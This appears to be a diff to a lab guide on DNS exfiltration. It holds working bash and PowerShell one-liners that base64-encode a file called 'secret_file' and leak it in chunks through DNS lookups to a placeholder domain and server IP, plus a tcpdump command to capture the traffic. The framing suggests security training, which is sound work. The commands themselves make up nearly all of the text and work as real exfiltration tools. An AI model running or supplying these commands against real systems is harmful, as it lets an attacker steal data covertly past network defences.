@@ -15,7 +15,7 @@ sudo tcpdump -i any udp port -w dns_capture.cap
 #replace lab.domain with lab domain or leave if lab is on localhost, replace lab-ip with machine's ip.
 
 #Linux (bash)
-FILE="secret_file"; DOMAIN="lab.domain"; IP="lab-ip"; i=0; for CHUNK in $(base64 -w 0 "$FILE" | grep -oE '.{1,60}'); do nslookup "${i}-${CHUNK}.${DOMAIN}" $IP >/dev/null; ((i++)); sleep 0.1; done
+FILE_TO_SEND="secret_file"; TARGET_DOMAIN="lab.domain"; SERVER_IP="lab-ip"; i=0; for CHUNK in $(base64 -w 0 "$FILE_TO_SEND" | grep -oE '.{1,60}'); do echo "Sending Chunk $i..."; dig @$SERVER_IP "${i}-${CHUNK}.${TARGET_DOMAIN}" +short > /dev/null 2>&1; ((i++)); sleep 0.1; done; echo "Done. All $i chunks sent."
 
 #Windows (Powershell)
 $f="secret_file"; $d="lab.domain"; $s="lab-ip"; $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes($f)); $i=0; while($i -lt $b.Length){ $c=$b.Substring($i, [Math]::Min(60, $b.Length-$i)); nslookup "$($i/60)-$c.$d" $s >$null; $i+=60; Start-Sleep -m 100 }
